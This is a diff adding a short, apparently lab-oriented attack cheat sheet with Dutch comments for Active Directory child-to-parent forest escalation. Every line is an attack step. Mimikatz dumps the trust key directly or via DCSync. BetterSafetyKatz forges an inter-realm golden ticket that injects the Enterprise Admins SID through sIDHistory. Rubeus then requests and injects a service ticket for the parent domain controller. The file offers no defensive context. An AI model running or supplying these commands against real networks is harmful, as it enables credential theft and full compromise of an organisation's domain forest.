@@ -1,0 +1,9 @@
+# Child-to-Parent trust escalation via sIDHistory
+# Stap 1: Trust key ophalen
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc01
+# Of via DCSync:
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:child\parent$"'
+# Stap 2: Inter-realm TGT forgery (DA -> EA)
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /rc4:TRUST_KEY /service:krbtgt /target:domain.local /ticket:C:\Windows\tasks\trust_tkt.kirbi" "exit"
+# Stap 3: TGS aanvragen + injecteren
+.\Rubeus.exe asktgs /ticket:C:\Windows\tasks\trust_tkt.kirbi /service:cifs/parent-dc.domain.local /dc:parent-dc.domain.local /ptt
